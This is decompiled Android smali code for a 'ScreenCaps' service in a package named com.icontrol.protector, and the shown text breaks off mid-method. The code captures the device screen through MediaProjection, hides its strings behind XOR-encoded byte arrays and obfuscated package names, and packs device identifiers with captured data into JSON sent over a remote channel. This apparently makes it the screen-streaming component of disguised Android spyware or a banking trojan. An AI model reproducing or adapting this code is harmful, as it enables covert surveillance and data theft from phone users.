.class public Lcom/icontrol/protector/ScreenCaps;
.super Landroid/app/Service;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/ScreenCaps$g;,
        Lcom/icontrol/protector/ScreenCaps$f;,
        Lcom/icontrol/protector/ScreenCaps$e;
    }
.end annotation


# static fields
.field private static A:I

.field private static B:Ljava/lang/String;

.field private static C:Landroid/content/Context;

.field private static final n:Ljava/lang/String;

.field private static final o:Ljava/lang/String;

.field private static final p:Ljava/lang/String;

.field private static final q:Ljava/lang/String;

.field private static final r:Ljava/lang/String;

.field private static final s:Ljava/lang/String;

.field private static final t:Ljava/lang/String;

.field private static final u:Ljava/lang/String;

.field private static final v:Ljava/lang/String;

.field public static w:Ljava/util/List;

.field public static x:Ljava/lang/Object;

.field public static y:Ljava/lang/Boolean;

.field public static z:Ljava/lang/String;


# instance fields
.field private b:Landroid/media/projection/MediaProjection;

.field private c:Landroid/media/ImageReader;

.field private d:Landroid/os/Handler;

.field private e:Landroid/view/Display;

.field private f:Landroid/hardware/display/VirtualDisplay;

.field private g:I

.field private h:I

.field private i:I

.field private j:I

.field private k:Lcom/icontrol/protector/ScreenCaps$g;

.field private l:Lntidisestablish/neumonoul/floccinaucinih/ks;

.field private m:Lntidisestablish/neumonoul/floccinaucinih/m70;


# direct methods
.method static constructor <clinit>()V
    .locals 5

    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->n:Ljava/lang/String;

    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    const/4 v0, 0x5

    new-array v2, v0, [B

    fill-array-data v2, :array_4

    new-array v3, v1, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    const/4 v2, 0x4

    new-array v3, v2, [B

    fill-array-data v3, :array_6

    new-array v4, v1, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/ScreenCaps;->q:Ljava/lang/String;

    new-array v3, v2, [B

    fill-array-data v3, :array_8

    new-array v4, v1, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    new-array v4, v1, [B

    fill-array-data v4, :array_b

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v3, v1, [B

    fill-array-data v3, :array_d

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->t:Ljava/lang/String;

    new-array v0, v2, [B

    fill-array-data v0, :array_e

    new-array v3, v1, [B

    fill-array-data v3, :array_f

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->u:Ljava/lang/String;

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_10

    new-array v3, v1, [B

    fill-array-data v3, :array_11

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->v:Ljava/lang/String;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->w:Ljava/util/List;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->x:Ljava/lang/Object;

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Ljava/lang/Boolean;

    const/16 v0, 0x32

    sput v0, Lcom/icontrol/protector/ScreenCaps;->A:I

    new-array v0, v2, [B

    fill-array-data v0, :array_12

    new-array v1, v1, [B

    fill-array-data v1, :array_13

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->B:Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        0x39t
        -0x6t
        -0x29t
        0x6et
        0x10t
        -0x76t
        -0x74t
        -0x3dt
        0x31t
        -0x27t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x50t
        -0x57t
        -0x4ct
        0x1ct
        0x75t
        -0x11t
        -0x1et
        -0x80t
    .end array-data

    :array_2
    .array-data 1
        -0x18t
        0x7bt
        -0x5et
        -0x7ct
        0x3dt
        -0x5et
        -0x61t
        -0x77t
        -0xbt
        0x7at
        -0x4ct
    .end array-data

    :array_3
    .array-data 1
        -0x46t
        0x3et
        -0xft
        -0x2ft
        0x71t
        -0xat
        -0x40t
        -0x36t
    .end array-data

    :array_4
    .array-data 1
        -0x4ct
        -0x59t
        0x65t
        0x15t
        0x4ct
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x1bt
        -0xet
        0x29t
        0x41t
        0x15t
        -0x7at
        -0x23t
        0x5at
    .end array-data

    :array_6
    .array-data 1
        -0x17t
        -0x5t
        -0x20t
        0x18t
    .end array-data

    :array_7
    .array-data 1
        -0x46t
        -0x4ct
        -0x5dt
        0x53t
        0x7bt
        -0x74t
        -0x22t
        -0x6t
    .end array-data

    :array_8
    .array-data 1
        -0xbt
        0x4ct
        0x68t
        0x5ft
    .end array-data

    :array_9
    .array-data 1
        -0x4ft
        0xdt
        0x3ct
        0x1et
        0x50t
        0x63t
        -0x2ct
        0x68t
    .end array-data

    :array_a
    .array-data 1
        -0x8t
        0x62t
        -0x18t
        0x40t
        -0x73t
        0x19t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x47t
        0x21t
        -0x44t
        0x9t
        -0x3et
        0x57t
        -0x65t
        0x35t
    .end array-data

    :array_c
    .array-data 1
        0x31t
        -0x4dt
        0x39t
        0x8t
        0x67t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x62t
        -0x19t
        0x78t
        0x5at
        0x33t
        0x23t
        0x47t
        0x69t
    .end array-data

    :array_e
    .array-data 1
        0xat
        -0x5ft
        0x5at
        0x30t
    .end array-data

    :array_f
    .array-data 1
        0x59t
        -0xbt
        0x15t
        0x60t
        0x51t
        -0x6ct
        -0x79t
        -0x6bt
    .end array-data

    :array_10
    .array-data 1
        0x0t
        0x6t
        0x73t
        -0x3ft
        -0x20t
        0xat
        -0x25t
        -0x77t
        0x3t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x73t
        0x65t
        0x1t
        -0x5ct
        -0x7bt
        0x64t
        -0x48t
        -0x18t
    .end array-data

    :array_12
    .array-data 1
        -0x5ft
        -0x53t
        0x3at
        -0x3t
    .end array-data

    :array_13
    .array-data 1
        -0x31t
        -0x28t
        0x56t
        -0x6ft
        0x55t
        -0x53t
        0x9t
        -0x5et
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static A(I)V
    .locals 0

    .line 1
    sput p0, Lcom/icontrol/protector/ScreenCaps;->A:I

    return-void
.end method

.method public static B(Ljava/lang/String;)V
    .locals 0

    .line 1
    sput-object p0, Lcom/icontrol/protector/ScreenCaps;->B:Ljava/lang/String;

    return-void
.end method

.method private C(ILandroid/content/Intent;)V
    .locals 3

    .line 1
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iget-object v2, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    if-nez v2, :cond_0

    invoke-virtual {v0, p1, p2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    if-eqz p1, :cond_0

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object p1

    iget p1, p1, Landroid/util/DisplayMetrics;->densityDpi:I

    iput p1, p0, Lcom/icontrol/protector/ScreenCaps;->g:I

    const/4 p1, 0x6

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array p2, v1, [B

    fill-array-data p2, :array_3

    invoke-static {p1, p2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/WindowManager;

    invoke-interface {p1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->e:Landroid/view/Display;

    iget-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    new-instance p2, Lcom/icontrol/protector/ScreenCaps$f;

    const/4 v0, 0x0

    invoke-direct {p2, p0, v0}, Lcom/icontrol/protector/ScreenCaps$f;-><init>(Lcom/icontrol/protector/ScreenCaps;Lcom/icontrol/protector/ScreenCaps$a;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    invoke-virtual {p1, p2, v0}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->u()V

    new-instance p1, Lcom/icontrol/protector/ScreenCaps$g;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    invoke-direct {p1, p0, p2}, Lcom/icontrol/protector/ScreenCaps$g;-><init>(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;)V

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->k:Lcom/icontrol/protector/ScreenCaps$g;

    invoke-virtual {p1}, Landroid/view/OrientationEventListener;->canDetectOrientation()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->k:Lcom/icontrol/protector/ScreenCaps$g;

    invoke-virtual {p1}, Landroid/view/OrientationEventListener;->enable()V

    :cond_0
    return-void

    :array_0
    .array-data 1
        -0x1et
        0x56t
        -0x6t
        0x5t
        0x6ct
        0x75t
        -0x7ct
        -0x70t
        -0x20t
        0x59t
        -0x5t
        0xft
        0x79t
        0x43t
        -0x65t
        -0x74t
    .end array-data

    :array_1
    .array-data 1
        -0x71t
        0x33t
        -0x62t
        0x6ct
        0xdt
        0x2at
        -0xct
        -0x1et
    .end array-data

    :array_2
    .array-data 1
        -0x72t
        0x5dt
        0x4at
        -0x46t
        -0x3ct
        -0x5bt
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x7t
        0x34t
        0x24t
        -0x22t
        -0x55t
        -0x2et
        -0x29t
        -0x19t
    .end array-data
.end method

.method private D(Landroid/content/Context;)V
    .locals 1

    .line 1
    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/oq;

    move-result-object v0

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

.method private E()V
    .locals 3

    .line 1
    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Ljava/lang/Boolean;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->E:Ljava/lang/String;

    invoke-static {v1, v2, v0}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-static {v0}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->m:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz v0, :cond_0

    const/16 v1, 0xe

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x3e8

    invoke-interface {v0, v2, v1}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z

    :cond_0
    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    if-eqz v0, :cond_1

    new-instance v1, Lcom/icontrol/protector/ScreenCaps$d;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/ScreenCaps$d;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_1
    return-void

    :array_0
    .array-data 1
        0x20t
        0x6at
        -0x19t
        -0xct
        -0x65t
        -0x64t
        0x1et
        0x7ft
        0x30t
        0x65t
        -0x6t
        -0x1et
        -0x69t
        -0x64t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x63t
        0x6t
        -0x78t
        -0x79t
        -0xet
        -0xet
        0x79t
        0x5ft
    .end array-data
.end method

.method private a(Landroid/content/Context;Ljava/lang/String;)V
    .locals 8

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->m:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz v0, :cond_3

    const/4 v0, 0x2

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->w:Ljava/lang/String;

    const/4 v3, 0x0

    invoke-static {p1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/icontrol/protector/ScreenCaps;->B:Ljava/lang/String;

    const/4 v4, 0x4

    new-array v5, v4, [B

    fill-array-data v5, :array_4

    new-array v6, v1, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    sget-object v2, Lcom/icontrol/protector/ScreenCaps;->B:Ljava/lang/String;

    goto :goto_0

    :catch_0
    move-exception p1

    goto/16 :goto_1

    :cond_0
    :goto_0
    if-nez v0, :cond_1

    return-void

    :cond_1
    if-nez v2, :cond_2

    return-void

    :cond_2
    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->y:Ljava/lang/String;

    new-array v5, v4, [B

    fill-array-data v5, :array_6

    new-array v6, v1, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {p1, v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const/4 v5, 0x3

    new-array v6, v5, [B

    fill-array-data v6, :array_8

    new-array v7, v1, [B

    fill-array-data v7, :array_9

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v5, [B

    fill-array-data v2, :array_a

    new-array v6, v1, [B

    fill-array-data v6, :array_b

    invoke-static {v2, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v2, v1, [B

    fill-array-data v2, :array_d

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v2, 0xa

    new-array v2, v2, [B

    fill-array-data v2, :array_e

    new-array v6, v1, [B

    fill-array-data v6, :array_f

    invoke-static {v2, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v4, [B

    fill-array-data v0, :array_10

    new-array v2, v1, [B

    fill-array-data v2, :array_11

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v5, [B

    fill-array-data v2, :array_12

    new-array v4, v1, [B

    fill-array-data v4, :array_13

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v5, [B

    fill-array-data v0, :array_14

    new-array v2, v1, [B

    fill-array-data v2, :array_15

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v5, [B

    fill-array-data p2, :array_16

    new-array v0, v1, [B

    fill-array-data v0, :array_17

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->m:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->e(Ljava/lang/String;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_3
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x6at
        0x78t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x21t
        0x3ct
        -0x41t
        0x27t
        0x9t
        -0x1ft
        -0x61t
        0x10t
    .end array-data

    :array_2
    .array-data 1
        0x6et
        -0x79t
        0x68t
        0x6ft
        -0x42t
        -0x1ct
        -0x6at
        0x7at
    .end array-data

    :array_3
    .array-data 1
        0x2at
        -0x1et
        0x1et
        0x6t
        -0x23t
        -0x7ft
        -0x1t
        0x1et
    .end array-data

    :array_4
    .array-data 1
        -0x4bt
        -0x15t
        -0x72t
        -0x28t
    .end array-data

    :array_5
    .array-data 1
        -0x25t
        -0x62t
        -0x1et
        -0x4ct
        -0x4ft
        0xet
        0x7dt
        -0x66t
    .end array-data

    :array_6
    .array-data 1
        -0x5et
        -0x39t
        -0x2bt
        -0x34t
    .end array-data

    :array_7
    .array-data 1
        -0x34t
        -0x4et
        -0x47t
        -0x60t
        0x8t
        0x56t
        0x6t
        -0x1et
    .end array-data

    :array_8
    .array-data 1
        -0x76t
        0x37t
        0x1bt
    .end array-data

    :array_9
    .array-data 1
        -0x1dt
        0x53t
        0x7dt
        -0x4at
        -0x7ft
        0x6bt
        0x75t
        -0x9t
    .end array-data

    :array_a
    .array-data 1
        -0x37t
        -0xet
        0x13t
    .end array-data

    :array_b
    .array-data 1
        -0x47t
        -0x65t
        0x77t
        0xft
        0x1dt
        0x65t
        0x78t
        0x21t
    .end array-data

    :array_c
    .array-data 1
        0x58t
        0x61t
        0x18t
        -0x3at
        0x4ft
    .end array-data

    nop

    :array_d
    .array-data 1
        0x31t
        0x15t
        0x61t
        -0x4at
        0x2at
        0x57t
        0x73t
        0x7et
    .end array-data

    :array_e
    .array-data 1
        -0x4et
        -0x3et
        -0x1t
        0x12t
        0x71t
        0x37t
        0x4bt
        -0x4ft
        -0x71t
        -0x26t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x1ft
        -0x52t
        -0x73t
        0x4dt
        0x12t
        0x5bt
        0x22t
        -0x2ct
    .end array-data

    :array_10
    .array-data 1
        0x5bt
        0x4et
        -0xat
        0x17t
    .end array-data

    :array_11
    .array-data 1
        0x28t
        0x3bt
        -0x6ct
        0x74t
        -0x17t
        -0x60t
        -0x2ft
        -0x4et
    .end array-data

    :array_12
    .array-data 1
        -0x2et
        -0x1at
        0x45t
    .end array-data

    :array_13
    .array-data 1
        -0x41t
        -0x6bt
        0x22t
        -0x80t
        -0xat
        0x33t
        0x4dt
        -0x5dt
    .end array-data

    :array_14
    .array-data 1
        0x5at
        0x68t
        0x10t
    .end array-data

    :array_15
    .array-data 1
        0x37t
        0x1bt
        0x77t
        -0x63t
        -0x7t
        0x55t
        -0x3t
        0x22t
    .end array-data

    :array_16
    .array-data 1
        -0x77t
        0x5at
        -0x13t
    .end array-data

    :array_17
    .array-data 1
        -0x16t
        0x33t
        -0x63t
        -0x33t
        -0x19t
        0x18t
        0x3dt
        -0x5t
    .end array-data
.end method

.method static synthetic c(Lcom/icontrol/protector/ScreenCaps;)Landroid/media/ImageReader;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    return-object p0
.end method

.method static synthetic d(Lcom/icontrol/protector/ScreenCaps;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    return p0
.end method

.method static synthetic e(Lcom/icontrol/protector/ScreenCaps;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->u()V

    return-void
.end method

.method static synthetic f(Lcom/icontrol/protector/ScreenCaps;)Lcom/icontrol/protector/ScreenCaps$g;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->k:Lcom/icontrol/protector/ScreenCaps$g;

    return-object p0
.end method

.method static synthetic g(Lcom/icontrol/protector/ScreenCaps;)Landroid/media/projection/MediaProjection;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    return-object p0
.end method

.method static synthetic h(Lcom/icontrol/protector/ScreenCaps;)Landroid/os/Handler;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    return-object p0
.end method

.method static synthetic i(Lcom/icontrol/protector/ScreenCaps;Landroid/os/Handler;)Landroid/os/Handler;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    return-object p1
.end method

.method static synthetic j(Lcom/icontrol/protector/ScreenCaps;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    return p0
.end method

.method static synthetic k()I
    .locals 1

    .line 1
    sget v0, Lcom/icontrol/protector/ScreenCaps;->A:I

    return v0
.end method

.method static synthetic l(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/ScreenCaps;->a(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic m(Lcom/icontrol/protector/ScreenCaps;)Lntidisestablish/neumonoul/floccinaucinih/m70;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->m:Lntidisestablish/neumonoul/floccinaucinih/m70;

    return-object p0
.end method

.method static synthetic n(Lcom/icontrol/protector/ScreenCaps;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->m:Lntidisestablish/neumonoul/floccinaucinih/m70;

    return-object p1
.end method

.method static synthetic o(Lcom/icontrol/protector/ScreenCaps;)Lntidisestablish/neumonoul/floccinaucinih/ks;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->l:Lntidisestablish/neumonoul/floccinaucinih/ks;

    return-object p0
.end method

.method static synthetic p(Lcom/icontrol/protector/ScreenCaps;Lntidisestablish/neumonoul/floccinaucinih/ks;)Lntidisestablish/neumonoul/floccinaucinih/ks;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->l:Lntidisestablish/neumonoul/floccinaucinih/ks;

    return-object p1
.end method

.method static synthetic q(Lcom/icontrol/protector/ScreenCaps;)Landroid/view/Display;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->e:Landroid/view/Display;

    return-object p0
.end method

.method static synthetic r(Lcom/icontrol/protector/ScreenCaps;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/ScreenCaps;->j:I

    return p0
.end method

.method static synthetic s(Lcom/icontrol/protector/ScreenCaps;I)I
    .locals 0

    .line 1
    iput p1, p0, Lcom/icontrol/protector/ScreenCaps;->j:I

    return p1
.end method

.method static synthetic t(Lcom/icontrol/protector/ScreenCaps;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->f:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method private u()V
    .locals 10

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->C:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x3

    new-array v4, v4, [B

    fill-array-data v4, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

